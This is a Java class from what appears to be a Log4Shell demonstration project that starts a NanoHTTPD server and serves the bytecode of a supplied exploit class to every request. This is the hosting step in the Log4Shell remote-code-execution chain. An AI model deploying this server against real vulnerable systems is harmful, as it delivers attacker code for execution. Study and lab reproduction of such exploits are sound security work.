package io.github.hurynovich.log4shell.environment;

import fi.iki.elonen.NanoHTTPD;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import static fi.iki.elonen.NanoHTTPD.Response.Status.OK;

public class HttpServerSetup {
    private final byte[] bytecode;
    private final HttpServer serv;

    public HttpServerSetup(int port, Class<?> exploitClazz) {
        serv = new HttpServer(port);
        bytecode = getBytecode(exploitClazz);
    }

    public void start(){
        try {
            serv.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true);
            System.out.println("HTTP server started.");
        } catch (IOException e) {
            throw new Error("Failed to start HTTP server", e);
        }
    }

    public void stop(){
        serv.stop();
    }

    private byte[] getBytecode(Class<?> exploitClazz) {
        final byte[] bytecode;
        String path = "/" + exploitClazz.getName().replaceAll("\\.", "/" ) + ".class";
        var bytecodeInput = exploitClazz.getResourceAsStream(path);
        try(bytecodeInput){
            var buffer = new ByteArrayOutputStream();
            int b;
            while ( (b = bytecodeInput.read()) >= 0){
                buffer.write(b);
            }
            bytecode = buffer.toByteArray();
        } catch (IOException e) {
            throw new Error("Failed to load exploit bytecode.");
        }
        System.out.println("Bytecode was loaded");
        return bytecode;
    }

    private class HttpServer extends NanoHTTPD {

        public HttpServer(int port) {
            super(port);
        }

        @Override
        public Response serve(IHTTPSession session) {
            System.out.println("Processing HTTP request... " + session.getUri() );
            return newFixedLengthResponse(OK, "application/java-byte-code", new ByteArrayInputStream(bytecode), bytecode.length);
        }
    }
}
